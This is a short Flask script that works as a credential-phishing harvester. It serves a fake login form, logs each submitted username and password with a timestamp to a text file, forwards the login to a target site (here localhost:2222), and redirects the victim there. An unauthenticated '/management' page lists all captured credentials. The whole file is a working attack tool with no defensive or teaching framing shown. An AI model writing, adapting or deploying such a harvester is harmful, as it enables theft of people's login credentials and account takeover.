import time

import requests
from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
target = 'http://localhost:2222'

def capture_credentials(username, password):
    with open('credentials_custom.txt', 'a') as f:
        f.write(f'[{time.time()}] {username}:{password}\n')

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Get username + password from login form, record to file, and then redirect to real page
        username, password = [request.form.get('username'), request.form.get('password')]
        capture_credentials(username, password)
        redirect(target)

        return redirect(requests.post(target, data={'username': username, 'password': password}).url, code=307)

    # Render the fake login form
    return render_template('index_custom.html')

@app.route('/management', methods=['GET'])
def management():
    # Render the credentials viewer page
    with open('credentials_custom.txt', 'r') as f:
        credentials = f.read().splitlines()
        return render_template('management.html', credentials=credentials)

if __name__ == "__main__":
    app.run()